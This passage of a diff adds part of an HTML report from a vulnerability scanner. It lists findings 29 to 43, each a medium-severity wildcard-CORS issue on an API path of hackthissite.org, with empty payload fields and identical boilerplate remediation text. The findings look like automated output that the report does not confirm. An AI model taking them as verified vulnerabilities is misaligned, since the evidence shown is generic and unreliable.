+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>29. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/openapi.json</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>30. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/graphql</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>31. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/api/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>32. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/v1</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>33. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/api</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>34. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/api/v3</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>35. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/api/auth</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>36. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/v2</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>37. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/token</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>38. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/user</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>39. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/graphiql</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>40. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/swagger-ui</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>41. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/api/v2</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>42. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/login</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<div class="vuln-card" style="border-left-color:#e67e00">
+  <h3>43. API &nbsp;<span class="badge" style="background:#e67e00">Medium</span>
+  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS 6.4</span></h3>
+  <div class="row"><span class="lbl">URL:</span><span>https://www.hackthissite.org/users</span></div>
+  <div class="row"><span class="lbl">Parameter:</span><span>endpoint</span></div>
+  <div class="row"><span class="lbl">Evidence:</span><span>Wildcard CORS (Access-Control-Allow-Origin: *)</span></div>
+  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span></div>
+  <div class="code">Payload: </div>
+  <div class="rem">💡 Remediation: Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. Validate all inputs. Use security headers (CORS, CSP). Reference: OWASP API Security Top 10.</div>
+</div>
+<footer>HSR Advanced v4.0 — Authorized security testing only.</footer></div></body></html>
